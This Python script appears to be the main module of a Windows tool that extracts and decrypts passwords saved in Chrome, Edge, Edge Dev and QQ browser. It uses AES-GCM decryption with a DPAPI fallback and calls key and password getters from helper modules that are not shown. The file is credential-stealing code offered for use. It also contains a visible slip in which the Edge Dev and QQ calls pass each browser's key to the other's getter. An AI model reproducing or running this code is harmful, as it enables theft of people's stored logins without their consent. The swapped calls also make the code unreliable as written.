import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

from get import *
from info import *


def get_chrome_datetime(chromedate):
    """从chrome格式的datetime返回一个`datetime.datetime`对象
因为'chromedate'的格式是1601年1月以来的微秒数"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # 不受支持
            return ""

def main():
    # chrome
    get_password_chrome(get_encryption_key_chrome())
    # edge
    get_password_edge(get_encryption_key_edge())
    # edge dev
    get_password_qq(get_encryption_key_edge_dev())
    # qq
    get_password_edge_dev(get_encryption_key_qq())



if __name__ == "__main__":
    main()
